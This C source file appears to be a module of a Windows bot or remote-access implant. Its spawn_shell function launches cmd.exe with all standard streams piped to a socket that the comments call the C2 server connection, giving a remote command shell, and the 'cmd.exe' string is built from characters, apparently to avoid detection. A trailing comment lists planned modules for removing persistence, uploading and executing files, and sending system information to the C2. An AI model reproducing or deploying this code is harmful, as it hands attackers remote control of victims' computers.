#include <windows.h>
#include "modules.h"

/* spawn a shell with the cmd process and pipe stdin, out, and err to the socket */
int spawn_shell(HANDLE sock_pipe)
{
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  char process[8]= {'c','m','d','.','e','x','e','\0'};
  int result= 0;

  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

  /* send stdin, stdout, and stderr of the 
     created process to the socket connection (C2Server) */
  si.hStdInput= si.hStdOutput= si.hStdError= sock_pipe;

  ZeroMemory(&pi, sizeof(pi));

  /* create the shell */
  if (!(CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)))
      result= 1;
  
  /* wait for the process to end, then close the handles */
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  return result;
}

/* Modules in development:
   clean up - delete run keys, delete bot
   upload - upload a file to the machine and execute it 
   get environment - send info on the system environment to c2*/




